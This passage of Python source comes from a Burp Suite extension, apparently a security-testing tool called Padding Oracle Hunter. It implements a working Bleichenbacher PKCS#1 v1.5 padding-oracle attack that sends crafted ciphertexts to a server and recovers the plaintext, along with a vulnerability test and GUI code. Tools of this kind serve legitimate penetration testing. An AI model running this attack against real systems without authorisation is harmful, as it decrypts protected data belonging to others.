                JOptionPane.showMessageDialog(self._jPaddingOracleTab, e, "Exception", JOptionPane.ERROR_MESSAGE)
                return


    def PKCS7(self, invocation):
        # Intialize the variables
        self.gHttpRequestRawStringPKCS7=""
        self.gHttpRequestStringPKCS7=""        
        self.gPayloadPKCS7=""
        self.gPayloadFormatPKCS7=""
        self.gSelectedPayloadPKCS7=None
        self.gOpThreadPKCS7 = None
        self.gIsPayloadUrlEncodedPKCS7 = False

        # enabled the format dropdown box and url encode checkbox
        self.__jComboBoxFormatPKCS7.setSelectedIndex(0)
        self.__jComboBoxFormatPKCS7.setEnabled(True)
        self.__jCheckBoxUrlEncodedPKCS7.setSelected(False)
        self.__jCheckBoxUrlEncodedPKCS7.setEnabled(True)        

        # Get the http request message
        invMessages  = invocation.getSelectedMessages()
        if len(invMessages) == 0:
            return
        self.gReqResPKCS7 = invMessages[0]
        self.gHttpRequestRawStringPKCS7 = self._helpers.bytesToString(self.gReqResPKCS7.getRequest())         
        self.__jEditorPaneReqPKCS7.setText(self.gHttpRequestRawStringPKCS7)

        # Reset all the fields        
        self.__textPadMessagePKCS7.setText("")
        self.__textPlaintextPKCS7.setText("")
        self.__jTextAreaOutputPKCS7.setText("")        

        # switch to the PKCS7 tab              
        self._jPaddingOracleTab.setSelectedComponent(self.__jPanelPKCS7)
        parentTab = self._jPaddingOracleTab.getParent()
        parentTab.setSelectedComponent(self._jPaddingOracleTab)

# *************************************** PKCS#1 v1.5 ***************************************
    # global variables
    gReqResPKCS15 = IHttpRequestResponse
    gHttpRequestRawStringPKCS15 = ""    
    gPayloadPKCS15 = ""    
    gOpThreadPKCS15 = None
    gSelectedPayloadPKCS15 = None
    gModulusPKCS15=0
    gExponentPKCS15=0
    gPadMsgSelPKCS15 = ""
    gPadMsgPKCS15 = ""    
    gByteLenPKCS15 = 0
    gQueriesPKCS15 = 0
    gTimePKCS15 = 0
    gIntervalPKCS15 = namedtuple('Interval', ['lower_bound', 'upper_bound'])
    gIsPayloadUrlEncodedPKCS15 = False


    def DisplayOutput_PKCS15(self, text):
        self.__jTextAreaOutputPKCS15.append(text)


    def setGUI_PKCS15(self):
        self.__jPanelPKCS15 = JPanel()
        jPanelLayoutPKCS15 = GroupLayout(self.__jPanelPKCS15)
        self.__jPanelPKCS15.setLayout(jPanelLayoutPKCS15)
        jPanelLayoutPKCS15.setAutoCreateGaps(True)
        jPanelLayoutPKCS15.setAutoCreateContainerGaps(True)       

        self.__jLabelReqPKCS15 = JLabel("Request")        
        self.__jScrollPaneReqPKCS15 = JScrollPane()
        self.__jEditorPaneReqPKCS15 = JEditorPane()
        self.__jEditorPaneReqPKCS15.setEditable(False)                        
        self.__jScrollPaneReqPKCS15.setViewportView(self.__jEditorPaneReqPKCS15)
        
        self.__jButtonClearPayloadPKCS15 = JButton("Clear Selection",actionPerformed=self.clearPayload_PKCS15)
        self.__jButtonSelPayloadPKCS15 = JButton("Select Payload",actionPerformed=self.selectPayload_PKCS15)

        self.__jLabelFormatPKCS15 = JLabel("Format:")
        self.__jComboBoxFormatPKCS15 = JComboBox(['Hex', 'Base64', 'Decimal'])
        self.__jComboBoxFormatPKCS15.setSelectedIndex(0)

        self.__jCheckBoxUrlEncodedPKCS15=JCheckBox("Url Encoded") 

        self.__jLabelPublicExpPKCS15 = JLabel("Public Exponent e:")        
        self.__textPublicExpPKCS15 = JTextField()
        self.__textPublicExpPKCS15.setToolTipText("RSA public exponent in decimal")        

        self.__jLabelPublicModPKCS15 = JLabel("Public Modulus n:")        
        self.__textPublicModPKCS15 = JTextField()
        self.__textPublicModPKCS15.setToolTipText("RSA public modulus in decimal")

        self.__jLabelPadMessagePKCS15 = JLabel("Padding Response:")        
        self.__textPadMessagePKCS15 = JTextField()        
        self.__textPadMessagePKCS15.setToolTipText("part or full of the valid or invalid padding response, only used in the decryption operation")
        self.__jComboBoxPadMsgPKCS15 = JComboBox(['Invalid', 'Valid'])
        self.__jComboBoxPadMsgPKCS15.setSelectedIndex(0)

        self.__jLabelUpdateIntervalPKCS15 = JLabel("Update Interval:")
        self.__jComboBoxUpdateIntervalPKCS15 = JComboBox(['100', '1000', '10000'])
        self.__jComboBoxUpdateIntervalPKCS15.setSelectedIndex(0)

        self.__jButtonTestPKCS15 = JButton("Test", actionPerformed=self.testPayload_PKCS15)
        self.__jButtonDecPKCS15 = JButton("Decrypt", actionPerformed=self.decryptPayload_PKCS15)
        self.__jButtonStopPKCS15 = JButton("Stop", actionPerformed=self.stopOperation_PKCS15)

        self.__jLabelOutPKCS15 = JLabel("Output")        
        self.__jTextAreaOutputPKCS15 = JTextArea()
        self.__jTextAreaOutputPKCS15.setEditable(False)
        self.__jTextAreaOutputPKCS15.setColumns(20)
        self.__jTextAreaOutputPKCS15.setRows(5)
        self.__jScrollPaneOutPKCS15 = JScrollPane()
        self.__jScrollPaneOutPKCS15.setViewportView(self.__jTextAreaOutputPKCS15)        


        jPanelLayoutPKCS15.setHorizontalGroup(   
            jPanelLayoutPKCS15.createParallelGroup()
            .addComponent(self.__jLabelReqPKCS15)
            .addComponent(self.__jScrollPaneReqPKCS15, GroupLayout.PREFERRED_SIZE, 0, 1080)
            .addGroup(
                jPanelLayoutPKCS15.createSequentialGroup()
                .addGap(300, 300, 300)                                                  
                .addComponent(self.__jButtonSelPayloadPKCS15)                
                .addGap(20, 20, 20)                
                .addComponent(self.__jLabelFormatPKCS15)                                
                .addComponent(self.__jComboBoxFormatPKCS15,GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
                .addGap(20, 20, 20)
                .addComponent(self.__jCheckBoxUrlEncodedPKCS15)
                .addGap(20, 20, 20)                                  
                .addComponent(self.__jButtonClearPayloadPKCS15))                
            .addGroup(
                jPanelLayoutPKCS15.createSequentialGroup()
                .addGroup( 
                          jPanelLayoutPKCS15.createParallelGroup()
                          .addComponent(self.__jLabelPublicExpPKCS15)
                          .addComponent(self.__jLabelPublicModPKCS15)                
                          .addComponent(self.__jLabelPadMessagePKCS15)
                          .addComponent(self.__jLabelUpdateIntervalPKCS15))
                .addGroup( 
                          jPanelLayoutPKCS15.createParallelGroup()                          
                          .addComponent(self.__textPublicExpPKCS15, GroupLayout.PREFERRED_SIZE, 870, GroupLayout.PREFERRED_SIZE)
                          .addComponent(self.__textPublicModPKCS15, GroupLayout.PREFERRED_SIZE, 870, GroupLayout.PREFERRED_SIZE)
                          .addComponent(self.__textPadMessagePKCS15, GroupLayout.PREFERRED_SIZE, 870, GroupLayout.PREFERRED_SIZE)
                          .addComponent(self.__jComboBoxUpdateIntervalPKCS15,GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
                .addGap(20, 20, 20)  
                .addComponent(self.__jComboBoxPadMsgPKCS15,GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))                
                
            .addComponent(self.__jLabelOutPKCS15)
            .addComponent(self.__jScrollPaneOutPKCS15,GroupLayout.PREFERRED_SIZE, 0, 1080)            
            .addGroup(
                jPanelLayoutPKCS15.createSequentialGroup()
                .addGap(240, 240, 240)
                .addComponent(self.__jButtonTestPKCS15)                
                .addGap(165, 165, 165)
                .addComponent(self.__jButtonDecPKCS15)
                .addGap(165, 165, 165)
                .addComponent(self.__jButtonStopPKCS15))            
        )

        jPanelLayoutPKCS15.setVerticalGroup(
            jPanelLayoutPKCS15.createSequentialGroup()
            .addComponent(self.__jLabelReqPKCS15)
            .addComponent(self.__jScrollPaneReqPKCS15, GroupLayout.PREFERRED_SIZE, 0, Short.MAX_VALUE)
            .addGap(15, 15, 15)            
            .addGroup(
                jPanelLayoutPKCS15.createParallelGroup()
                .addComponent(self.__jButtonSelPayloadPKCS15, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)                                
                .addComponent(self.__jLabelFormatPKCS15)
                .addComponent(self.__jComboBoxFormatPKCS15, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
                .addComponent(self.__jCheckBoxUrlEncodedPKCS15, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
                .addComponent(self.__jButtonClearPayloadPKCS15, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
            .addGap(20, 20, 20)            
            .addGroup(
                jPanelLayoutPKCS15.createParallelGroup()
                .addComponent(self.__jLabelPublicExpPKCS15)
                .addComponent(self.__textPublicExpPKCS15, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
            .addGap(20, 20, 20)
            .addGroup(
                jPanelLayoutPKCS15.createParallelGroup()
                .addComponent(self.__jLabelPublicModPKCS15)
                .addComponent(self.__textPublicModPKCS15, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
            .addGap(20, 20, 20)
            .addGroup(
                jPanelLayoutPKCS15.createParallelGroup()
                .addComponent(self.__jLabelPadMessagePKCS15)
                .addComponent(self.__textPadMessagePKCS15, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
                .addComponent(self.__jComboBoxPadMsgPKCS15, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
            .addGap(20, 20, 20)
            .addGroup(
                jPanelLayoutPKCS15.createParallelGroup()
                .addComponent(self.__jLabelUpdateIntervalPKCS15)
                .addComponent(self.__jComboBoxUpdateIntervalPKCS15, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
            .addGap(20, 20, 20)
            .addComponent(self.__jLabelOutPKCS15)
            .addComponent(self.__jScrollPaneOutPKCS15,GroupLayout.PREFERRED_SIZE, 0, Short.MAX_VALUE)
            .addGap(20, 20, 20)
            .addGroup(
                jPanelLayoutPKCS15.createParallelGroup()
                .addComponent(self.__jButtonTestPKCS15, GroupLayout.PREFERRED_SIZE, 40, GroupLayout.PREFERRED_SIZE)                            
                .addComponent(self.__jButtonDecPKCS15, GroupLayout.PREFERRED_SIZE, 40, GroupLayout.PREFERRED_SIZE)
                .addComponent(self.__jButtonStopPKCS15, GroupLayout.PREFERRED_SIZE, 40, GroupLayout.PREFERRED_SIZE))            
            .addGap(50, 50, 50)            
        )

    
    def BytesToLong_PKCS15(self, bytes_obj):
        return int(hexlify(bytes_obj),16)        


    def LongToBytes_PKCS15(self, integer):
        value = hex(integer).replace('0x','').rstrip("L")
        if(len(value)%2 != 0):
            value = "0" + value
        return unhexlify(value)
        

    # math.ceil and math.floor don't work for large integers
    def Floor_PKCS15(self, a, b):    
        return a // b


    def Ceil_PKCS15(self, a, b):    
        return a // b + (a % b > 0)


    def Decode_PKCS15(self, encoded):
        encoded = encoded[2:]
        idx = encoded.index(b'\x00')
        message = encoded[idx + 1:]
        return message


    def Encode_PKCS15(self, message, total_bytes):    
        # Encodes the given message using PKCS1 v1.5 scheme:
        # PKCS1(M) = 0x00 | 0x02 | [non-zero padding bytes] | 0x00 | [M]
        # length(PKCS1(M)) = total_bytes
        # 11 = 3 constant bytes and at aleast 8 bytes for padding        
        padding_byte = b''

        if len(message) > total_bytes - 11:
            self.DisplayOutput_PKCS15("Message to big for encoding scheme!")
            return

        pad_len = total_bytes - 3 - len(message)
        # non-zero padding bytes
        randombyte = random.sample(range(1, 256), pad_len)
        for r in randombyte:
            padding_byte = chr(r) + padding_byte

        encoded = b'\x00\x02' + padding_byte + b'\x00' + message
        return encoded


    def ServiceRequest_PKCS15(self, ciphertext):
        try:
            # Convert the payload back to the original format from hex
            payload = self.ConvertFromHexToPayloadFormat(ciphertext, self.gPayloadFormatPKCS15, self.gIsPayloadUrlEncodedPKCS15)
            
            if(payload!=None):

                # Replaced the request with payload            
                newHttpRequest = self.gHttpRequestStringPKCS15.replace("#PAYLOAD#", payload)            
                    
                # Update the request with new parameter
                reqInfo = self._helpers.analyzeRequest(newHttpRequest)
                headers = reqInfo.getHeaders()            
                param = newHttpRequest[reqInfo.getBodyOffset():]            
                newHttpRequest = self._helpers.buildHttpMessage(headers, param)            
                    
                # Send the request            
                httpService = self.gReqResPKCS15.getHttpService()                        
                res = self._callbacks.makeHttpRequest(self._helpers.buildHttpService(httpService.getHost(),httpService.getPort(), httpService.getProtocol()), newHttpRequest)                        
                return res.getResponse()
        except Exception as e:
            self.DisplayOutput_PKCS15("Service request Error: {}".format(e))
            return ""            


    def Oracle_PKCS15(self, ciphertext):        
        # Increment the queries        
        self.gQueriesPKCS15 +=1

        # Retrieve the update interval
        updateInterval = int(self.__jComboBoxUpdateIntervalPKCS15.getSelectedItem())
        # Update the query base on the update Interval
        if self.gQueriesPKCS15 % updateInterval == 0:
            currentTime = time.time() 
            self.DisplayOutput_PKCS15("Query: #{}    time: {} s\n".format(self.gQueriesPKCS15, round(currentTime - self.gTimePKCS15,3)))                

        # send the service request    
        response = self.ServiceRequest_PKCS15(ciphertext)                
        
        # if the message is an invalid padding message
        if self.gPadMsgSelPKCS15=="Invalid":
            if hexlify(self.gPadMsgPKCS15.encode()) in hexlify(response):
                return False
            else:
                return True
        # if the message is a valid padding message
        else:
            if hexlify(self.gPadMsgPKCS15.encode()) not in hexlify(response):
                return False
            else:
                return True        

    # Step 2.A.
    def FindSmallest_PKCS15(self,lower_bound, c):
        """
        Find the smallest s >= lower_bound,
        such that (c * s^e) (mod n) decrypts to a PKCS conforming string
        """
        s = lower_bound
        
        while True:
            if(self.gThreadStopPKCS15 == True):
                return
            attempt = (c * pow(s, self.gExponentPKCS15, self.gModulusPKCS15)) % self.gModulusPKCS15            
            if self.Oracle_PKCS15(hexlify(self.LongToBytes_PKCS15(attempt)).decode()):
                return s
            s += 1


    # Step 2.C.
    def FindInRange_PKCS15(self, a, b, prev_s, B, c):
        """
        Given the interval [a, b], reduce the search
        only to relevant regions (determined by r)
        and stop when an s value that gives
        a PKCS1 conforming string is found.
        """
        ri = self.Ceil_PKCS15(2 * (b * prev_s - 2 * B), self.gModulusPKCS15)

        while True:
            if(self.gThreadStopPKCS15 == True):
                return
            si_lower = self.Ceil_PKCS15(2 * B + ri * self.gModulusPKCS15, b)
            si_upper = self.Ceil_PKCS15(3 * B + ri * self.gModulusPKCS15, a)

            for si in range(si_lower, si_upper):
                attempt = (c * pow(si, self.gExponentPKCS15, self.gModulusPKCS15)) % self.gModulusPKCS15
                # get oracle from the server
                if self.Oracle_PKCS15(hexlify(self.LongToBytes_PKCS15(attempt)).decode()):
                    return si
            ri += 1


    def SafeIntervalInsert_PKCS15(self, M_new, interval):        
        # Deal with interval overlaps when adding a new one to the list
        for i, (a, b) in enumerate(M_new):

            # overlap found, construct the larger interval
            if (b >= interval.lower_bound) and (a <= interval.upper_bound):
                lb = min(a, interval.lower_bound)
                ub = max(b, interval.upper_bound)

                M_new[i] = self.gIntervalPKCS15(lb, ub)
                return M_new

        # no overlaps found, just insert the new interval
        M_new.append(interval)
        return M_new


    # Step 3.
    def UpdateIntervals_PKCS15(self, M, s, B):        
        # After found the s value, compute the new list of intervals
        M_new = []

        for a, b in M:
            r_lower = self.Ceil_PKCS15(a * s - 3 * B + 1, self.gModulusPKCS15)            
            r_upper = self.Ceil_PKCS15(b * s - 2 * B, self.gModulusPKCS15)            

            for r in range(r_lower, r_upper):
                lower_bound = max(a, self.Ceil_PKCS15(2 * B + r * self.gModulusPKCS15, s))
                upper_bound = min(b, self.Floor_PKCS15(3 * B - 1 + r * self.gModulusPKCS15, s))
                interval = self.gIntervalPKCS15(lower_bound, upper_bound)                
                M_new = self.SafeIntervalInsert_PKCS15(M_new, interval)
        return M_new   


    def Bleichenbacher_PKCS15(self, ciphertext):        
        # Get the intial time
        self.gTimePKCS15 = time.time()                
        self.DisplayOutput_PKCS15("Decrypting ciphertext: {}\n\n".format(self.gSelectedPayloadPKCS15))
        # Step 1. is only needed when the ciphertext is
        # not PKCS1 conforming

        # integer value of ciphertext    
        c = self.BytesToLong_PKCS15(ciphertext)        
        B = 2 ** (8 * (self.gByteLenPKCS15 - 2))        
        M = [self.gIntervalPKCS15(2*B, 3*B-1)]        
        i = 1        
        
        while True:
            if(self.gThreadStopPKCS15 == True):
                return
            # Step 2.A.
            if i==1:                
                s = self.FindSmallest_PKCS15(self.Ceil_PKCS15(self.gModulusPKCS15, 3*B), c)
            
            # Step 2.B.
            elif len(M) > 1:            
                s = self.FindSmallest_PKCS15(s + 1, c)

            # Step 2.C. 
            else: # len(M)=1            
                a, b = M[0]
                s = self.FindInRange_PKCS15(a, b, s, B, c)            

            # Step 3.        
            M = self.UpdateIntervals_PKCS15(M, s, B)

            # Step 4.
            if len(M) == 1:            
                a, b = M[0]                
                if a == b:
                    # Update the last query
                    updateInterval = int(self.__jComboBoxUpdateIntervalPKCS15.getSelectedItem())                    
                    if(self.gQueriesPKCS15 % updateInterval !=0):
                        currentTime = time.time()
                        self.DisplayOutput_PKCS15("Query: #{}    time: {} s\n".format(self.gQueriesPKCS15, round(currentTime - self.gTimePKCS15,3)))
                    
                    # Output the plaintext
                    plaintext = self.LongToBytes_PKCS15(a % self.gModulusPKCS15)
                    plaintext = self.Decode_PKCS15(plaintext)
                    self.DisplayOutput_PKCS15("\nDecrypted plaintext:\n")
                    self.DisplayOutput_PKCS15("Hex: {}\n".format(hexlify(plaintext)))
                    self.DisplayOutput_PKCS15("Bytes: {}\n".format(plaintext))
                    return
            i=i+1

    
    def Test_PKCS15(self):        
        # compute test value with valid padding
        testValidPadValue = self.BytesToLong_PKCS15(self.Encode_PKCS15(b"test_pkcs15",self.gByteLenPKCS15))                
        testValidPadCipher = pow(testValidPadValue, self.gExponentPKCS15, self.gModulusPKCS15)        
        testValidPadResult = self.ServiceRequest_PKCS15(hexlify(self.LongToBytes_PKCS15(testValidPadCipher)).decode())        
        ResInfo = self._helpers.analyzeResponse(testValidPadResult)                
        testValidPadResponse = testValidPadResult[ResInfo.getBodyOffset():]           

        # compute test value with invalid padding
        testInvalidPadValue = self.BytesToLong_PKCS15(b"test_pkcs15")
        testInvalidPadCipher = pow(testInvalidPadValue, self.gExponentPKCS15, self.gModulusPKCS15)
        testInvalidPadResult = self.ServiceRequest_PKCS15(hexlify(self.LongToBytes_PKCS15(testInvalidPadCipher)).decode())
        ResInfo = self._helpers.analyzeResponse(testInvalidPadResult)
        testInvalidPadResponse = testInvalidPadResult[ResInfo.getBodyOffset():]        

        # The sever is vulnerable if the response with valid padding is not equal to the response with invalid padding
        if(testValidPadResponse!=testInvalidPadResponse):
            self.__jTextAreaOutputPKCS15.setForeground(Color(255, 0, 0))            

            # Display invalid padding response
            self.DisplayOutput_PKCS15("**** Invalid Padding ****\n")
            payload = self.ConvertFromHexToPayloadFormat(hexlify(self.LongToBytes_PKCS15(testInvalidPadCipher)).decode(),self.gPayloadFormatPKCS15, self.gIsPayloadUrlEncodedPKCS15)
            self.DisplayOutput_PKCS15("Payload:\n{}\n".format(payload))
            self.DisplayOutput_PKCS15("Response:\n{}\n\n".format(unhexlify(hexlify(testInvalidPadResponse))))            

            # Display valid padding response
            self.DisplayOutput_PKCS15("**** Valid Padding ****\n")
            payload = self.ConvertFromHexToPayloadFormat(hexlify(self.LongToBytes_PKCS15(testValidPadCipher)).decode(),self.gPayloadFormatPKCS15, self.gIsPayloadUrlEncodedPKCS15)
            self.DisplayOutput_PKCS15("Payload:\n{}\n".format(payload))
            self.DisplayOutput_PKCS15("Response:\n{}\n\n".format(unhexlify(hexlify(testValidPadResponse))))

           # Display the conclusion
            self.DisplayOutput_PKCS15("The server is likely vulnerable to padding oracle attack\n")            
        else:
            # Display the conclusion
            self.DisplayOutput_PKCS15("The server is not vulnerable to padding oracle attack\n")
        
        
    def InputValidation_PKCS15(self, mode):
        try:
            # Set default font display to black
            self.__jTextAreaOutputPKCS15.setForeground(Color(0, 0, 0))

            # make sure all the previous thread was terminated
            if self.gOpThreadPKCS15!=None and self.gOpThreadPKCS15.isAlive():                
                    JOptionPane.showMessageDialog(self._jPaddingOracleTab, "Previous thread is still running! Please click stop button to terminate it", "Warning", JOptionPane.WARNING_MESSAGE)                
                    return False

            # reset the variables
            self.gThreadStopPKCS15 = False            
            self.__jTextAreaOutputPKCS15.setText("")
            self.gQueriesPKCS15 = 0            

            # check if the payload is selected
            if self.gSelectedPayloadPKCS15==None:
                JOptionPane.showMessageDialog(self._jPaddingOracleTab, "Incorrect payload selection!", "Error", JOptionPane.ERROR_MESSAGE)
                return False         
            
            # Get public exponent
            exponent = re.sub('\W+','', self.__textPublicExpPKCS15.getText())
            if exponent=="":
                  JOptionPane.showMessageDialog(self._jPaddingOracleTab, "Please provide the RSA public exponent in decimal!", "Error", JOptionPane.ERROR_MESSAGE)
                  return False
            self.gExponentPKCS15 = int(exponent, 10)            
            
            # Get public modulus
            modulus = re.sub('\W+','',self.__textPublicModPKCS15.getText())
            if modulus=="":
                  JOptionPane.showMessageDialog(self._jPaddingOracleTab, "Please provide the RSA public modulus in decimal!", "Error", JOptionPane.ERROR_MESSAGE)
                  return False
            self.gModulusPKCS15 = int(modulus, 10)            

            # Compute the ByteLength
            self.gByteLenPKCS15 = self.gModulusPKCS15.bit_length()//8

            # Get valid or invalid padding message
            if mode=="decrypt":
                self.gPadMsgSelPKCS15 = self.__jComboBoxPadMsgPKCS15.getSelectedItem()
                padmsg = self.__textPadMessagePKCS15.getText()
                if padmsg=="":
                    JOptionPane.showMessageDialog(self._jPaddingOracleTab, "Please provide part or full of the valid or invalid padding response!", "Error", JOptionPane.ERROR_MESSAGE)
                    return False                
                self.gPadMsgPKCS15 = padmsg
            
            return True

        except Exception as e:                
            JOptionPane.showMessageDialog(self._jPaddingOracleTab, e, "Exception", JOptionPane.ERROR_MESSAGE)
            return False    


    def PKCS15(self, invocation):
        # Intialize variables
        self.gHttpRequestRawStringPKCS15=""
        self.gHttpRequestStringPKCS15=""        
        self.gPayloadPKCS15=""
        self.gPayloadFormatPKCS15=""
        self.gSelectedPayloadPKCS15=None        
        self.gOpThreadPKCS15 = None
        self.gIsPayloadUrlEncodedPKCS15 = False

        # enabled the format dropdown box and url encode checkbox
        self.__jComboBoxFormatPKCS15.setSelectedIndex(0)
        self.__jComboBoxFormatPKCS15.setEnabled(True)
        self.__jCheckBoxUrlEncodedPKCS15.setSelected(False)
        self.__jCheckBoxUrlEncodedPKCS15.setEnabled(True)        

        # Get and set the http request message
        invMessages  = invocation.getSelectedMessages()
        if len(invMessages) == 0:
            return
        self.gReqResPKCS15 = invMessages[0]
        self.gHttpRequestRawStringPKCS15 = self._helpers.bytesToString(self.gReqResPKCS15.getRequest())         
        self.__jEditorPaneReqPKCS15.setText(self.gHttpRequestRawStringPKCS15)

         # Reset all the fields
        self.__textPublicExpPKCS15.setText("")
        self.__textPublicModPKCS15.setText("")
        self.__textPadMessagePKCS15.setText("")        
        self.__jTextAreaOutputPKCS15.setText("")
        self.__jComboBoxUpdateIntervalPKCS15.setSelectedIndex(0)

        # switch to the PKCS1_5 tab              
        self._jPaddingOracleTab.setSelectedComponent(self.__jPanelPKCS15)
        parentTab = self._jPaddingOracleTab.getParent()
        parentTab.setSelectedComponent(self._jPaddingOracleTab)

    
    def selectPayload_PKCS15(self, button):        
        # Retrieve the selected the payload        
        payload = self.__jEditorPaneReqPKCS15.getSelectedText().replace("\n", "")

        # Stored the selected the payload
        self.gSelectedPayloadPKCS15 = payload        

        if(payload!=None):
            # Check whether the payload is url encoded.
            if self.__jCheckBoxUrlEncodedPKCS15.isSelected():
                self.gIsPayloadUrlEncodedPKCS15 = True                    
            
            # Get the payload format and convert it to hex
            try:
                payload = self.ConverToHexFromPayloadFormat(payload, self.__jComboBoxFormatPKCS15.getSelectedItem(), self.gIsPayloadUrlEncodedPKCS15)
                if payload != None:    
                    # validate the payload is hex
                    unhexlify(payload.encode())

                    self.gPayloadPKCS15 = payload
                    self.gPayloadFormatPKCS15 = self.__jComboBoxFormatPKCS15.getSelectedItem()

                    # Replace the selected payload with #PAYLOAD# so that we can process it during the attack
                    self.gHttpRequestStringPKCS15 = self.gHttpRequestRawStringPKCS15.replace(self.gSelectedPayloadPKCS15, "#PAYLOAD#")                   

                    # Show the selected the payload
                    bytesDisplay = self.gHttpRequestRawStringPKCS15.encode()        
                    insertionPointChar = chr(167)                         
                    bytesDisplay = bytesDisplay.replace(self.gSelectedPayloadPKCS15.encode(), insertionPointChar + self.gSelectedPayloadPKCS15.encode() + insertionPointChar)             
                    self.__jEditorPaneReqPKCS15.setText(bytesDisplay)

                    # Disabled the format dropdown box and url encode checkbox
                    self.__jComboBoxFormatPKCS15.setEnabled(False)
                    self.__jCheckBoxUrlEncodedPKCS15.setEnabled(False)

            except Exception as e:                
                JOptionPane.showMessageDialog(self._jPaddingOracleTab, e, "Exception", JOptionPane.ERROR_MESSAGE)
                return


    def testPayload_PKCS15(self, button):
        # Perform input validation
        initStatus = self.InputValidation_PKCS15("test")

        if(initStatus):
            # Start the Testing Thread           
            self.gOpThreadPKCS15 = threading.Thread(target=self.Test_PKCS15)                        
            self.gOpThreadPKCS15.start()
        

    def decryptPayload_PKCS15(self, button):
        # Perform input validation
        initStatus = self.InputValidation_PKCS15("decrypt")

        if(initStatus):
            # Start the Decryption Thread
            encrypted_string = unhexlify(self.gPayloadPKCS15)            
            self.gOpThreadPKCS15 = threading.Thread(target=self.Bleichenbacher_PKCS15, args=(encrypted_string,))                        
            self.gOpThreadPKCS15.start()            

    
    def stopOperation_PKCS15(self, button):
        self.DisplayOutput_PKCS15("Operation halted!\n")
        self.gThreadStopPKCS15 = True

    
    def clearPayload_PKCS15(self, button):
        if self.gHttpRequestRawStringPKCS15 !="":
            self.__jEditorPaneReqPKCS15.setText(self.gHttpRequestRawStringPKCS15)
            self.gSelectedPayloadPKCS15 = None

            # Enabled the format dropdown box and url encode checkbox
            self.__jComboBoxFormatPKCS15.setEnabled(True)
            self.__jCheckBoxUrlEncodedPKCS15.setEnabled(True)

# *************************************** Common Function ***************************************
    def ConvertFromHexToPayloadFormat(self, payload, format, urlEncoded):
        try:
            # default format is hex           
            if format=="Base64":
                # convert the hex encrypted_string to base64
                payload = unhexlify(payload)
                payload = self._helpers.base64Encode(payload).decode()
            elif format=="Decimal":                    
                # convert the hex encrypted_string to decimal             
                payload = str(int(payload,16))
            
            # Url Encode the payload if urlencoded checkbox is checked
            if(urlEncoded):                
                payload = self._helpers.urlEncode(payload)
            return payload
        except Exception as e:                
            JOptionPane.showMessageDialog(self._jPaddingOracleTab, e, "Exception", JOptionPane.ERROR_MESSAGE)
            return None 

    def ConverToHexFromPayloadFormat(self, payload, format, urlEncoded):
        try:
            # Check whether the payload is url encoded. If yes, url decode the payload 
            if (urlEncoded):
                payload = self._helpers.urlDecode(payload)

            # default format is hex
            if format=="Base64":
                # check whether the payload is base64                    
                payload = base64.b64decode(payload)                    
                # convert the payload to hex                   
                payload = hexlify(payload).decode()                    

            elif format=="Decimal":
                if (payload.isdecimal()==False):
                    raise ValueError("The payload is not decimal")
                # convert the payload to hex                    
                payload = hex(int(payload)).rstrip("L").replace("0x","")
                payload = payload.rjust(len(payload)+len(payload)%2,"0")
            return payload
        except Exception as e:                
            JOptionPane.showMessageDialog(self._jPaddingOracleTab, e, "Exception", JOptionPane.ERROR_MESSAGE)
            return None    


    def registerExtenderCallbacks(self, callbacks):
        # Set up the context menu        
        self.printInfo()
        callbacks.setExtensionName("Padding Oracle Hunter")
        callbacks.registerExtensionStateListener(self)
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.registerContextMenuFactory(self)

        # Create PKCS GUI
        self.setGUI_PKCS7()
        self.setGUI_PKCS15()

        # Setup PKCS Tabs
        self._jPaddingOracleTab = JTabbedPane()
        self._jPaddingOracleTab.addTab("PKCS#7", self.__jPanelPKCS7)
        self._jPaddingOracleTab.addTab("PKCS#1 v1.5", self.__jPanelPKCS15)
        callbacks.customizeUiComponent(self._jPaddingOracleTab)
        callbacks.addSuiteTab(self)                        
        
    
    def createMenuItems(self, invocation):
        # Create a menu item if the appropriate section of the UI is selected
        menu = []

        # Which part of the interface the user selects
        ctx = invocation.getInvocationContext()
        
        # Message Viewer Req will show menu item if selected by the user
        if ctx == IContextMenuInvocation.CONTEXT_MESSAGE_EDITOR_REQUEST or ctx == IContextMenuInvocation.CONTEXT_MESSAGE_VIEWER_REQUEST:
            menu.append(JMenuItem("PKCS#7", None, actionPerformed=lambda x, inv=invocation: self.PKCS7(inv)))
            menu.append(JMenuItem("PKCS#1 v1.5", None, actionPerformed=lambda x, inv=invocation: self.PKCS15(inv)))                    
        return menu if menu else None
           

    def extensionUnloaded(self):
        # stop all the thread
        self.gThreadStopPKCS7 = True
        self.gThreadStopPKCS15 = True           


    def getTabCaption(self):        
        return "Padding Oracle Hunter"


    def getUiComponent(self):
        return self._jPaddingOracleTab


    def printInfo(self):
        print('Padding Oracle Hunter v1.1\nCreated by: GovTech (Tan Inn Fung)')
